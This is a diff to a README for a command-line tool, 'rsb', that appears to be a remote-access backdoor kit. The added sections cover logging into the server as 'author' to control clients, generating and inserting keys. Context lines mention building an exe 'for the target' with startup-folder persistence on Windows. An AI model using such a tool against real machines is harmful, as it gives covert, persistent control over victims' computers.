@@ -47,6 +47,23 @@ rsb --server -a 192.168.0.111 -p 9999
 
 
 
+
+
+## Log to server as author.
+
+```bash
+rsb --auth -a 192.168.0.111 -p 9999
+```
+
+> - --auth is args container
+> - -a is server or device ip address
+> - -p is wich port you'll be listening to server and contacts
+> - -k (optional) use key
+
+###### connect to your server as an author and control your own clients.
+
+
+
 ## Generate exe for the target.
 
 ```bash
@@ -63,6 +80,24 @@ rsb --client -a 192.168.0.111 -p 9999
 ###### a shortcut in startup folder if the system is windows.
 
 
+
+## Generate new key.
+
+```bash
+rsb --key
+```
+
+###### generate a new key and save it in data\basic.py.
+
+
+
+## To insert key.
+
+```bash
+rsb --key -k your_key
+```
+
+> - -k is the key you want to insert to the tool files.
 
 ## Commands to use from server side.
 
